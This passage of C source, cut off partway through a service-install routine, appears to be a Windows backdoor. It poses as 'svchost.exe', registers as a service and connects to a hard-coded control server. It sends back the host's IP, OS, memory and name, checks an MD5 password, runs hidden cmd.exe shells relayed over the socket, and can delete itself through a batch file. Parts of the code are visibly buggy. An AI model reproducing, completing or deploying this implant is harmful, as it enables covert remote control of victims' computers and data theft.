#include <stdio.h>
#include <WinSock2.h>
#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <wininet.h>
#include <process.h>
#include <memory.h>
#include <time.h>

// GCC lwininet ws2_32
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Wininet.lib")
#pragma pack(1)
#pragma warning(disable: 4996) // avoid GetVersionEx to be warnedg
#define S_OK                                   ((HRESULT)0L)
#define S_FALSE                                ((HRESULT)1L)
#define false                                  FALSE
#define true                                   TRUE

#define bool                                   BOOL
#define ERROR_SUCCESS                           0L
#define	HEART_BEAT_TIME		1000 * 60 * 1// 心跳时间
#define	CMDSHELL_BEAT_TIME		1000 * 60 * 5// CMDSHELL存活时间
#define SERVER_HEARTS                           0
#define SERVER_RESET                            1
#define SERVER_SHELL                            2
#define SERVER_SHELL_CHANNEL                    3
#define SERVER_DOWNLOAD                         4
#define SERVER_OPENURL                          8
#define SERVER_SYSTEMINFO                       10          
#define SERVER_SHELL_ERROR                      12
#define SERVER_LOGIN                            14
void WINAPI BDHandler(DWORD dwControl);
void WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv);
char const AUTODELETE[20] = "AUTODELETEOPEN";
char const PASSWORD[33] = "44ff0b5e0f1eeff29de7d56c6eec3051";
char const RELEASE_NAME[20] = "svchost.exe";
char const SERVICEC_NAME[20] = "TestServer";
char const SIGN[10] = "customize";
char const D[50] = "127.0.0.1";
char const PORT[5] = "81";
enum STATUS {
    CONNECT = 1,
    OTHER   = 0,
} status;
SECURITY_ATTRIBUTES pipeattr1,pipeattr2; 
HANDLE hReadPipe1,hWritePipe1,hReadPipe2,hWritePipe2; 
SECURITY_ATTRIBUTES saIn, saOut;

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE ServiceStatusHandle;

struct CMSG{
        char sign[10];
        UINT16 mod;//自定义模式
        UINT32 l;
};

struct CSHELL{
    char *uuid;
    long time; // 开始时候的时间戳
    char *in_buff;// 用于接收数据
    BOOL live;//是否存活
    SOCKET socks;
};
struct CSHELL *SHELL = NULL;
int SHELL_SIZE = 0;

#ifndef _BASE64_H  
#define _BASE64_H  
  
unsigned char *base64_encode(unsigned char *str);  
  
unsigned char *bae64_decode(unsigned char *code);  
  
#endif

#ifndef MD5_H
#define MD5_H
 
typedef struct
{
    unsigned int count[2];
    unsigned int state[4];
    unsigned char buffer[64];   
}MD5_CTX;
 
                         
#define F(x,y,z) ((x & y) | (~x & z))
#define G(x,y,z) ((x & z) | (y & ~z))
#define H(x,y,z) (x^y^z)
#define I(x,y,z) (y ^ (x | ~z))
#define ROTATE_LEFT(x,n) ((x << n) | (x >> (32-n)))
#define FF(a,b,c,d,x,s,ac) \
          { \
          a += F(b,c,d) + x + ac; \
          a = ROTATE_LEFT(a,s); \
          a += b; \
          }
#define GG(a,b,c,d,x,s,ac) \
          { \
          a += G(b,c,d) + x + ac; \
          a = ROTATE_LEFT(a,s); \
          a += b; \
          }
#define HH(a,b,c,d,x,s,ac) \
          { \
          a += H(b,c,d) + x + ac; \
          a = ROTATE_LEFT(a,s); \
          a += b; \
          }
#define II(a,b,c,d,x,s,ac) \
          { \
          a += I(b,c,d) + x + ac; \
          a = ROTATE_LEFT(a,s); \
          a += b; \
          }                                            
void MD5Init(MD5_CTX *context);
void MD5Update(MD5_CTX *context,unsigned char *input,unsigned int inputlen);
void MD5Final(MD5_CTX *context,unsigned char digest[16]);
void MD5Transform(unsigned int state[4],unsigned char block[64]);
void MD5Encode(unsigned char *output,unsigned int *input,unsigned int len);
void MD5Decode(unsigned int *output,unsigned char *input,unsigned int len);
#endif

unsigned char PADDING[]={0x80,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
                         0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
                         0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
                         0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0};


unsigned char *base64_encode(unsigned char *str)  
{  
    long len;  
    long str_len;  
    unsigned char *res;  
    int i,j;  
//定义base64编码表  
    unsigned char *base64_table="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";  
  
//计算经过base64编码后的字符串长度  
    str_len=strlen(str);  
    if(str_len % 3 == 0)  
        len=str_len/3*4;  
    else  
        len=(str_len/3+1)*4;  
  
    res=malloc(sizeof(unsigned char)*len+1);  
    res[len]='\0';  
  
//以3个8位字符为一组进行编码  
    for(i=0,j=0;i<len-2;j+=3,i+=4)  
    {  
        res[i]=base64_table[str[j]>>2]; //取出第一个字符的前6位并找出对应的结果字符  
        res[i+1]=base64_table[(str[j]&0x3)<<4 | (str[j+1]>>4)]; //将第一个字符的后位与第二个字符的前4位进行组合并找到对应的结果字符  
        res[i+2]=base64_table[(str[j+1]&0xf)<<2 | (str[j+2]>>6)]; //将第二个字符的后4位与第三个字符的前2位组合并找出对应的结果字符  
        res[i+3]=base64_table[str[j+2]&0x3f]; //取出第三个字符的后6位并找出结果字符  
    }  
  
    switch(str_len % 3)  
    {  
        case 1:  
            res[i-2]='=';  
            res[i-1]='=';  
            break;  
        case 2:  
            res[i-1]='=';  
            break;  
    }  
  
    return res;  
}  
  
unsigned char *base64_decode(unsigned char *code)  
{  
//根据base64表，以字符找到对应的十进制数据  
    int table[]={0,0,0,0,0,0,0,0,0,0,0,0,
    		 0,0,0,0,0,0,0,0,0,0,0,0,
    		 0,0,0,0,0,0,0,0,0,0,0,0,
    		 0,0,0,0,0,0,0,62,0,0,0,
    		 63,52,53,54,55,56,57,58,
    		 59,60,61,0,0,0,0,0,0,0,0,
    		 1,2,3,4,5,6,7,8,9,10,11,12,
    		 13,14,15,16,17,18,19,20,21,
    		 22,23,24,25,0,0,0,0,0,0,26,
    		 27,28,29,30,31,32,33,34,35,
    		 36,37,38,39,40,41,42,43,44,
    		 45,46,47,48,49,50,51
    	       };  
    long len;  
    long str_len;  
    unsigned char *res;  
    int i,j;  
  
//计算解码后的字符串长度  
    len=strlen(code);  
//判断编码后的字符串后是否有=  
    if(strstr(code,"=="))  
        str_len=len/4*3-2;  
    else if(strstr(code,"="))  
        str_len=len/4*3-1;  
    else  
        str_len=len/4*3;  
  
    res=malloc(sizeof(unsigned char)*str_len+1);  
    res[str_len]='\0';  
  
//以4个字符为一位进行解码  
    for(i=0,j=0;i < len-2;j+=3,i+=4)  
    {  
        res[j]=((unsigned char)table[code[i]])<<2 | (((unsigned char)table[code[i+1]])>>4); //取出第一个字符对应base64表的十进制数的前6位与第二个字符对应base64表的十进制数的后2位进行组合  
        res[j+1]=(((unsigned char)table[code[i+1]])<<4) | (((unsigned char)table[code[i+2]])>>2); //取出第二个字符对应base64表的十进制数的后4位与第三个字符对应bas464表的十进制数的后4位进行组合  
        res[j+2]=(((unsigned char)table[code[i+2]])<<6) | ((unsigned char)table[code[i+3]]); //取出第三个字符对应base64表的十进制数的后2位与第4个字符进行组合  
    }  
  
    return res;  
  
}



/////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////
 
 //               Toolit  Function  START                  //

/////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////
void MD5Init(MD5_CTX *context)
{
     context->count[0] = 0;
     context->count[1] = 0;
     context->state[0] = 0x67452301;
     context->state[1] = 0xEFCDAB89;
     context->state[2] = 0x98BADCFE;
     context->state[3] = 0x10325476;
}
void MD5Update(MD5_CTX *context,unsigned char *input,unsigned int inputlen)
{
    unsigned int i = 0,index = 0,partlen = 0;
    index = (context->count[0] >> 3) & 0x3F;
    partlen = 64 - index;
    context->count[0] += inputlen << 3;
    if(context->count[0] < (inputlen << 3))
       context->count[1]++;
    context->count[1] += inputlen >> 29;
    
    if(inputlen >= partlen)
    {
       memcpy(&context->buffer[index],input,partlen);
       MD5Transform(context->state,context->buffer);
       for(i = partlen;i+64 <= inputlen;i+=64)
           MD5Transform(context->state,&input[i]);
       index = 0;        
    }  
    else
    {
        i = 0;
    }
    memcpy(&context->buffer[index],&input[i],inputlen-i);
}
void MD5Final(MD5_CTX *context,unsigned char digest[16])
{
    unsigned int index = 0,padlen = 0;
    unsigned char bits[8];
    index = (context->count[0] >> 3) & 0x3F;
    padlen = (index < 56)?(56-index):(120-index);
    MD5Encode(bits,context->count,8);
    MD5Update(context,PADDING,padlen);
    MD5Update(context,bits,8);
    MD5Encode(digest,context->state,16);
}
void MD5Encode(unsigned char *output,unsigned int *input,unsigned int len)
{
    unsigned int i = 0,j = 0;
    while(j < len)
    {
         output[j] = input[i] & 0xFF;  
         output[j+1] = (input[i] >> 8) & 0xFF;
         output[j+2] = (input[i] >> 16) & 0xFF;
         output[j+3] = (input[i] >> 24) & 0xFF;
         i++;
         j+=4;
    }
}
void MD5Decode(unsigned int *output,unsigned char *input,unsigned int len)
{
     unsigned int i = 0,j = 0;
     while(j < len)
     {
           output[i] = (input[j]) |
                       (input[j+1] << 8) |
                       (input[j+2] << 16) |
                       (input[j+3] << 24);
           i++;
           j+=4; 
     }
}
void MD5Transform(unsigned int state[4],unsigned char block[64])
{
     unsigned int a = state[0];
     unsigned int b = state[1];
     unsigned int c = state[2];
     unsigned int d = state[3];
     unsigned int x[64];
     MD5Decode(x,block,64);
     FF(a, b, c, d, x[ 0], 7, 0xd76aa478); /* 1 */
 FF(d, a, b, c, x[ 1], 12, 0xe8c7b756); /* 2 */
 FF(c, d, a, b, x[ 2], 17, 0x242070db); /* 3 */
 FF(b, c, d, a, x[ 3], 22, 0xc1bdceee); /* 4 */
 FF(a, b, c, d, x[ 4], 7, 0xf57c0faf); /* 5 */
 FF(d, a, b, c, x[ 5], 12, 0x4787c62a); /* 6 */
 FF(c, d, a, b, x[ 6], 17, 0xa8304613); /* 7 */
 FF(b, c, d, a, x[ 7], 22, 0xfd469501); /* 8 */
 FF(a, b, c, d, x[ 8], 7, 0x698098d8); /* 9 */
 FF(d, a, b, c, x[ 9], 12, 0x8b44f7af); /* 10 */
 FF(c, d, a, b, x[10], 17, 0xffff5bb1); /* 11 */
 FF(b, c, d, a, x[11], 22, 0x895cd7be); /* 12 */
 FF(a, b, c, d, x[12], 7, 0x6b901122); /* 13 */
 FF(d, a, b, c, x[13], 12, 0xfd987193); /* 14 */
 FF(c, d, a, b, x[14], 17, 0xa679438e); /* 15 */
 FF(b, c, d, a, x[15], 22, 0x49b40821); /* 16 */
 
 /* Round 2 */
 GG(a, b, c, d, x[ 1], 5, 0xf61e2562); /* 17 */
 GG(d, a, b, c, x[ 6], 9, 0xc040b340); /* 18 */
 GG(c, d, a, b, x[11], 14, 0x265e5a51); /* 19 */
 GG(b, c, d, a, x[ 0], 20, 0xe9b6c7aa); /* 20 */
 GG(a, b, c, d, x[ 5], 5, 0xd62f105d); /* 21 */
 GG(d, a, b, c, x[10], 9,  0x2441453); /* 22 */
 GG(c, d, a, b, x[15], 14, 0xd8a1e681); /* 23 */
 GG(b, c, d, a, x[ 4], 20, 0xe7d3fbc8); /* 24 */
 GG(a, b, c, d, x[ 9], 5, 0x21e1cde6); /* 25 */
 GG(d, a, b, c, x[14], 9, 0xc33707d6); /* 26 */
 GG(c, d, a, b, x[ 3], 14, 0xf4d50d87); /* 27 */
 GG(b, c, d, a, x[ 8], 20, 0x455a14ed); /* 28 */
 GG(a, b, c, d, x[13], 5, 0xa9e3e905); /* 29 */
 GG(d, a, b, c, x[ 2], 9, 0xfcefa3f8); /* 30 */
 GG(c, d, a, b, x[ 7], 14, 0x676f02d9); /* 31 */
 GG(b, c, d, a, x[12], 20, 0x8d2a4c8a); /* 32 */
 
 /* Round 3 */
 HH(a, b, c, d, x[ 5], 4, 0xfffa3942); /* 33 */
 HH(d, a, b, c, x[ 8], 11, 0x8771f681); /* 34 */
 HH(c, d, a, b, x[11], 16, 0x6d9d6122); /* 35 */
 HH(b, c, d, a, x[14], 23, 0xfde5380c); /* 36 */
 HH(a, b, c, d, x[ 1], 4, 0xa4beea44); /* 37 */
 HH(d, a, b, c, x[ 4], 11, 0x4bdecfa9); /* 38 */
 HH(c, d, a, b, x[ 7], 16, 0xf6bb4b60); /* 39 */
 HH(b, c, d, a, x[10], 23, 0xbebfbc70); /* 40 */
 HH(a, b, c, d, x[13], 4, 0x289b7ec6); /* 41 */
 HH(d, a, b, c, x[ 0], 11, 0xeaa127fa); /* 42 */
 HH(c, d, a, b, x[ 3], 16, 0xd4ef3085); /* 43 */
 HH(b, c, d, a, x[ 6], 23,  0x4881d05); /* 44 */
 HH(a, b, c, d, x[ 9], 4, 0xd9d4d039); /* 45 */
 HH(d, a, b, c, x[12], 11, 0xe6db99e5); /* 46 */
 HH(c, d, a, b, x[15], 16, 0x1fa27cf8); /* 47 */
 HH(b, c, d, a, x[ 2], 23, 0xc4ac5665); /* 48 */
 
 /* Round 4 */
 II(a, b, c, d, x[ 0], 6, 0xf4292244); /* 49 */
 II(d, a, b, c, x[ 7], 10, 0x432aff97); /* 50 */
 II(c, d, a, b, x[14], 15, 0xab9423a7); /* 51 */
 II(b, c, d, a, x[ 5], 21, 0xfc93a039); /* 52 */
 II(a, b, c, d, x[12], 6, 0x655b59c3); /* 53 */
 II(d, a, b, c, x[ 3], 10, 0x8f0ccc92); /* 54 */
 II(c, d, a, b, x[10], 15, 0xffeff47d); /* 55 */
 II(b, c, d, a, x[ 1], 21, 0x85845dd1); /* 56 */
 II(a, b, c, d, x[ 8], 6, 0x6fa87e4f); /* 57 */
 II(d, a, b, c, x[15], 10, 0xfe2ce6e0); /* 58 */
 II(c, d, a, b, x[ 6], 15, 0xa3014314); /* 59 */
 II(b, c, d, a, x[13], 21, 0x4e0811a1); /* 60 */
 II(a, b, c, d, x[ 4], 6, 0xf7537e82); /* 61 */
 II(d, a, b, c, x[11], 10, 0xbd3af235); /* 62 */
 II(c, d, a, b, x[ 2], 15, 0x2ad7d2bb); /* 63 */
 II(b, c, d, a, x[ 9], 21, 0xeb86d391); /* 64 */
     state[0] += a;
     state[1] += b;
     state[2] += c;
     state[3] += d;
}

BOOL CopyF(char* szPath,char *trPath,int bigger){
    if (bigger == 0){
        CopyFile(szPath,trPath,TRUE);
        return TRUE;
    }else{
        HANDLE pFile;
        DWORD fileSize;
        char *buffer;
        DWORD dwBytesRead,dwBytesToRead,tmpLen;
        pFile = CreateFile(szPath,GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if ( pFile == INVALID_HANDLE_VALUE){
            CloseHandle(pFile);
            return FALSE;
        }
        fileSize = GetFileSize(pFile,NULL);
        buffer = (char *) malloc(fileSize);
        ZeroMemory(buffer,fileSize);
        dwBytesToRead = fileSize;
        dwBytesRead = 0;
        ReadFile(pFile,buffer,dwBytesToRead,&dwBytesRead,NULL);
        CloseHandle(pFile);

        HANDLE pFile2;
        DWORD dwBytesWrite,dwBytesToWrite;
        pFile2 = CreateFile(trPath,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,  FILE_ATTRIBUTE_NORMAL,NULL);

        if ( pFile2 == INVALID_HANDLE_VALUE){
            CloseHandle(pFile);
            return FALSE;
        }
        dwBytesToWrite = fileSize;
        dwBytesWrite = 0;
        WriteFile(pFile2,buffer,dwBytesToWrite,&dwBytesWrite,NULL);

        char *blank= (char *) malloc(1024);
        ZeroMemory(blank,1024);
        for(int i = 0;i< bigger;i++){
            WriteFile(pFile2,blank,1024,&dwBytesWrite,NULL);
        }
        free(blank);
        CloseHandle(pFile2);
        free(buffer);

    }
}

void hex2str(unsigned char *inchar, unsigned int len, unsigned char *outtxt){
    unsigned char hbit,lbit;
    unsigned int i;
    for(i=0;i<len;i++)
    {
        hbit = (*(inchar+i)&0xf0)>>4;
        lbit = *(inchar+i)&0x0f;
        if (hbit>9) outtxt[2*i]='a'+hbit-10;
        else outtxt[2*i]='0'+hbit;
        if (lbit>9) outtxt[2*i+1]='a'+lbit-10;
        else    outtxt[2*i+1]='0'+lbit;
    }
    outtxt[2*i] = 0;
}

void DeleteSelf(char *szPath){
    FILE *pFile=NULL;
    pFile=fopen("T.bat","w");
    if(pFile==NULL)
    {
        return;
    }
    char*szBat=(char*)malloc(230);
    printf(szPath);                       
    sprintf(szBat,"del %s\r\n del T.bat",szPath);
    DWORD dwNum = 0;
    fputs(szBat,pFile);
    fclose(pFile);
    free(szBat);
    ShellExecuteA(NULL,"open","T.bat","","",SW_HIDE);
}

char* getIpAddress(){
    WSADATA wsaData;
    char name[255];//定义用于存放获得的主机名的变量 
    char *ip;//定义IP地址变量 
    PHOSTENT hostinfo;
    if ( WSAStartup( MAKEWORD(2,0), &wsaData ) == 0 ) {
        if( gethostname ( name, sizeof(name)) == 0) {
            if((hostinfo = gethostbyname(name)) != NULL) {
                ip = inet_ntoa (*(struct in_addr *)*hostinfo->h_addr_list);
            }
        }
    }
    return ip;
}

char* getOsInfo()
{
	// get os name according to version number
	OSVERSIONINFO osver = { sizeof(OSVERSIONINFO) };
	GetVersionEx(&osver);
	char *os_name;
	if (osver.dwMajorVersion == 5 && osver.dwMinorVersion == 0)
		os_name = "Windows 2000";
	else if (osver.dwMajorVersion == 5 && osver.dwMinorVersion == 1)
		os_name = "Windows XP";
	else if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 0)
		os_name = "Windows 2003";
	else if (osver.dwMajorVersion == 5 && osver.dwMinorVersion == 2)
		os_name = "windows vista";
	else if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 1)
		os_name = "windows 7";
	else if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 2)
		os_name = "windows 10";
    return os_name;
}

char* getMemoryInfo(){
    #define  GBYTES  1073741824  
    #define  MBYTES  1048576  
    #define  KBYTES  1024  
    #define  DKBYTES 1024.0 
    #define kMaxInfoBuffer 256

	char* memory_info;
    char  buffer[kMaxInfoBuffer];

	MEMORYSTATUSEX statusex;
	statusex.dwLength = sizeof(statusex);
	if (GlobalMemoryStatusEx(&statusex))
	{
		unsigned long long total = 0, remain_total = 0, avl = 0, remain_avl = 0;
		double decimal_total = 0, decimal_avl = 0;
		remain_total = statusex.ullTotalPhys % GBYTES;
		total = statusex.ullTotalPhys / GBYTES;
		avl = statusex.ullAvailPhys / GBYTES;
		remain_avl = statusex.ullAvailPhys % GBYTES;
		if (remain_total > 0)
			decimal_total = (remain_total / MBYTES) / DKBYTES;
		if (remain_avl > 0)
			decimal_avl = (remain_avl / MBYTES) / DKBYTES;
 
		decimal_total += (double)total;
		decimal_avl += (double)avl;
		
		sprintf(buffer, "Total %.2f GB (%.2f GB available)", decimal_total, decimal_avl);
		memory_info = buffer;
        // printf(memory_info);
        return memory_info;
	}
	
}

char* getComperName(){
    char *name;
    char szPath[128] = "";
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    gethostname(szPath, sizeof(szPath));
    printf("%s\n", szPath);
    WSACleanup();
    name=szPath;
    return name;

}

char* getSystemInfomation(char* systeminfo){
    static char data[1024];
    char *os;
    char *ip;
    char * memory;
    char * name;
    os = getOsInfo();
    ip = getIpAddress();
    memory = getMemoryInfo();
    name = getComperName();
    sprintf(data,"%s\n%s\n%s\n%s\n",ip,os,memory,name);
    if (data[1024] != '\0'){
       data[1024]='\0'; 
    }
    strcpy(systeminfo,data);
    
}
/////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////

 //               Server  Function  END                    //
 //               Server  Function  START                  //

/////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////
void Clock(void *par){

}
void ShellThread(void *par){
    // i是数组下标，全局变量SHELL的下标
    
    int i = (int)par;
    int ret;
    char Buff[1024]; 
    SECURITY_ATTRIBUTES pipeattr1,pipeattr2; 
    HANDLE hReadPipe1,hWritePipe1,hReadPipe2,hWritePipe2; 
    pipeattr1.nLength=12; 
    pipeattr1.lpSecurityDescriptor=0; 
    pipeattr1.bInheritHandle=TRUE; 
    CreatePipe(&hReadPipe1,&hWritePipe1,&pipeattr1,0); 
    pipeattr2.nLength=12; 
    pipeattr2.lpSecurityDescriptor=0; 
    pipeattr2.bInheritHandle=TRUE; 
    CreatePipe(&hReadPipe2,&hWritePipe2,&pipeattr2,0); 
    STARTUPINFO si; 
    ZeroMemory(&si,sizeof(si)); 
    si.dwFlags=STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; 
    si.wShowWindow=SW_HIDE; 
    si.hStdInput=hReadPipe2; 
    si.hStdOutput=si.hStdError=hWritePipe1; 
    char cmdline[]="cmd.exe"; 
    PROCESS_INFORMATION ProcessInformation; 
    ret=CreateProcess(NULL,cmdline,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation); 

    unsigned long lBytesRead; 
    
    while ((SHELL+i)->live) 
    { 
        printf("H");
        ret=PeekNamedPipe(hReadPipe1,Buff,1024,&lBytesRead,0, 0  ); 
        while(lBytesRead) 
        { 
            
            ret=ReadFile(hReadPipe1,Buff,lBytesRead,&lBytesRead,0); 
            
            if (!ret) {
                break;
            }
            printf("uuid:%s",(SHELL+i)->uuid);
            struct CMSG msg = {
                .sign =  "customize",
                .mod = SERVER_SHELL_CHANNEL,
                .l = lBytesRead+strlen((SHELL+i)->uuid)+2,
             };
            char * s_pck = malloc(lBytesRead+strlen((SHELL+i)->uuid)+2);
            strcat(s_pck,(SHELL+i)->uuid);
            strcat(s_pck,"|");
            strcat(s_pck,Buff);
            strcat(s_pck,'\0');
            send((SOCKET)(SHELL+i)->socks,(char*)&msg,sizeof(struct CMSG),0);
            ret=send((SOCKET)(SHELL+i)->socks,s_pck,lBytesRead+strlen((SHELL+i)->uuid)+2,0);
            ZeroMemory(Buff,1024);
            if (ret<=0) {struct CMSG emsg = {
                    .sign =  "customize",
                    .mod = SERVER_RESET,
                    .l = 0
                    };
                    send((SHELL+i)->socks,(char*)&emsg,sizeof(struct CMSG),0);
                    break;}; 
        }
       
        if(*(SHELL+i)->in_buff != NULL){
            printf("no_CMD:%s",(SHELL+i)->in_buff);
            ret=WriteFile(hWritePipe2,(SHELL+i)->in_buff,lBytesRead,&lBytesRead,0);
            free((SHELL+i)->in_buff);
            *(SHELL+i)->in_buff=NULL;
        }
    }
    printf("aswl");
    free((SHELL+i)->uuid);
    free(SHELL+i);
    return;
}
void Hearts(void *sock){
    
    while (status=CONNECT)
    {
        printf("Hearts\n");
        
        struct CMSG msg = {
                .sign =  "customize",
                .mod = SERVER_HEARTS,
                .l = 0
             };
        int s = send((SOCKET)sock,(char*)&msg,sizeof(struct CMSG),0);
        if (s <= 0){
            // 心跳包发送失败，服务器挂了
            status=OTHER;
            close((SOCKET)sock);
            break;
        }
        status=CONNECT;
        Sleep(HEART_BEAT_TIME);
    }
    printf("End\n");
    _endthread();
    
}

void Handle(){
    WSADATA WSAData;
    SOCKET sock; 
    DWORD dwIP = 0; 
    SOCKADDR_IN addr_in;
    unsigned char decrypt[16]; 
    WSAStartup(MAKEWORD(2,2),&WSAData); 
    HOSTENT* pHS = gethostbyname(D);
    time_t t;
    int s;
    if(pHS!=NULL){
    struct in_addr addr;
    CopyMemory(&addr.S_un.S_addr, pHS->h_addr_list[0], pHS->h_length);
    dwIP = addr.S_un.S_addr;
    }else{
        WSACleanup();
        return;
    }
    addr_in.sin_family=AF_INET;
    addr_in.sin_port=htons(atoi(PORT)); 
    addr_in.sin_addr.S_un.S_addr=dwIP;
    sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    if (WSAConnect(sock,(struct sockaddr *)&addr_in,sizeof(addr_in),NULL,NULL,NULL,NULL)==SOCKET_ERROR) {
        return;
    }
    char  systeminfo[1024] ;
    getSystemInfomation(systeminfo);
    struct CMSG msg = {
                .sign =  "customize",
                .mod = SERVER_SYSTEMINFO,
                .l = (UINT32)strlen(systeminfo)
             };
    s = send(sock,(char*)&msg,sizeof(struct CMSG),0);
    if(s == -1 || s <= 0){
        close(sock);
        return;
    }
    s = send(sock,systeminfo,strlen(systeminfo),0);
    if(s == -1 || s <= 0){
        close(sock);
        return;
    }
    char * address = malloc(sizeof(struct CMSG));
    int ret = recv(sock,address,sizeof(struct CMSG),0);
    msg = *(struct CMSG*)address;
    if(ret == -1 || ret <= 0){
        close(sock);
        return;
        }
    if (strcmp(msg.sign,SIGN) != 0){close(sock);return;}
    if(msg.mod != SERVER_LOGIN){close(sock);return;}else{
        char tMd5[3];
        char result[33];
        // 验证服务器密码
        char * password = malloc(msg.l);
        
        ret = recv(sock,password,msg.l,0);
        printf("%s\n",password);
        if(ret == -1 || ret <= 0){
        close(sock);
        return;
        }
        MD5_CTX md5;
        MD5Init(&md5);         		
	    MD5Update(&md5,password,strlen(password));
	    MD5Final(&md5,decrypt);
        printf("Password:\n\tLoad:%s\n\tRemote:",PASSWORD);
        hex2str(decrypt,16,result);
        printf("%s\n",result);
        if (strcmp(PASSWORD,result)!=0){
            printf("Verify Failed\n");
            close(sock);
            return;
        }
    }
    free(address);
    status=CONNECT;
    _beginthread(Hearts,0,(void *)sock);
    

    while (status=CONNECT){
        
        char * address = malloc(sizeof(struct CMSG));
        int ret = recv(sock,address,sizeof(struct CMSG),0);
        msg = *(struct CMSG*)address;
        printf("Recv:\n\tMod:%d\n\tLen:%d\nData:%s\n\n",msg.mod,msg.l,address);
        if(ret == -1 || ret <= 0){break;}
        if (strcmp(msg.sign,SIGN) != 0){continue;}
        switch (msg.mod){
            case SERVER_SHELL:{
                // CMD命令
                char * cmd_shell = malloc(msg.l+1);
                ret = recv(sock,cmd_shell,msg.l,0);
                cmd_shell[  msg.l+1]="\00";
                printf("Recv CMD:%s",cmd_shell);
                char * uuid = strtok(cmd_shell,"|");
                if(uuid == NULL){
                    continue;
                }
                printf("uuid:%s\n", uuid);
                char * cmd = strtok(NULL, "|");
                printf("cmd:%s\n", cmd);
                for(int i=0;i<=SHELL_SIZE;i++){
                    if(SHELL!= NULL || SHELL+i != NULL){
                        if (strcmp((SHELL+i)->uuid,uuid)){
                            printf("Find Thread:%s",(SHELL+i)->uuid);
                            //收到cmd命令，重置定时器并且把数据丢到chan里面
                            t = time(NULL);
                            (SHELL+i)->in_buff = cmd;
                            (SHELL+i)->live = time(&t);
                            goto end;
                        }
                    }
                    
                }
                char * nodie_uuid = malloc(strlen(uuid));
                char * nodie_cmd = malloc(strlen(cmd));
                strcpy(nodie_uuid,uuid);
                strcpy(nodie_cmd,cmd);
                // 不存在线程，新建一个
                struct CSHELL S = {
                    .uuid = nodie_uuid,
                    .time = time(NULL),
                    .in_buff = nodie_cmd,
                    .live = TRUE,
                    .socks = sock,
                };
                
                int p ;
                for(int i=0;i<=SHELL_SIZE;i++){
                    if(SHELL != NULL){
                        if((SHELL+i)==NULL){
                            *(SHELL+i) = S;
                            p=i;
                            // 可能会被回收，阿拉不管了
                        }
                    }
                }
                
                //插空失败，那就新建一个
                struct CSHELL *old_ptr = SHELL;
                SHELL = (struct CSHELL *)malloc((SHELL_SIZE+1)*sizeof(struct CSHELL));
                if (SHELL == NULL){
                    //失败，就当无事发生
                    continue;
                }
                if(old_ptr != NULL){
                    for(int i=0;i<=SHELL_SIZE-1;i++){
                        *(SHELL+i) = *(old_ptr+i);
                    }
                }
                
                
                SHELL_SIZE+=1;
                
                
                *(SHELL+SHELL_SIZE-1)=S;
                p=SHELL_SIZE-1;
                free(old_ptr);
                _beginthread(ShellThread,0,(void *)p);
                
                end:
                free(cmd_shell);

                continue;
            }
                
            case SERVER_DOWNLOAD:
                {

                }
            case SERVER_OPENURL:
                {
                    continue;
                }
            case SERVER_SYSTEMINFO:
                continue;
        }
        free(address);
        
    }
    close(sock);
    return;
}




/////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////

 //               Toolit  Function  END                    //
 //               Kernel  Function  Start                  //

/////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////


void BDEntry(){

    CreateEventA(0,FALSE,FALSE,SERVICEC_NAME);
    while(1){
        Handle();
        printf("H\n");
        Sleep(3000);
    }
}

void WINAPI ServiceMain(DWORD dwArgc,  LPTSTR* lpszArgv){
    DWORD dwThreadId;
    // WriteToLog("Running..");
    if (!(ServiceStatusHandle = RegisterServiceCtrlHandler(SERVICEC_NAME,
                     BDHandler))) return;
    ServiceStatus.dwServiceType  = SERVICE_WIN32_OWN_PROCESS;
    ServiceStatus.dwCurrentState  = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted  = SERVICE_ACCEPT_STOP
                      | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwWin32ExitCode        = 0;
    ServiceStatus.dwCheckPoint            = 0;
    ServiceStatus.dwWaitHint              = 0;
    SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    ServiceStatus.dwCheckPoint   = 0;
    ServiceStatus.dwWaitHint     = 0;
    SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
    BDEntry();
}


void WINAPI BDHandler(DWORD dwControl)
{
 switch(dwControl)
 {
    case SERVICE_CONTROL_STOP:
		ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		break;
    case SERVICE_CONTROL_SHUTDOWN:
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		break;
    default:
        break;
 }
}

void ServiceInstall(BOOL auto_delete){
    char  szPath[MAX_PATH];
    char  target[MAX_PATH] ;
    char  tar_path[MAX_PATH];
    char  Direectory[MAX_PATH];

    char  cmd[255];
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    if (OpenEventA(2031619,FALSE,SERVICEC_NAME) != 0 ){
        return ;
    }
    SERVICE_TABLE_ENTRY ServiceTable[2];
    ServiceTable[0].lpServiceName = (char*)SERVICEC_NAME;
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
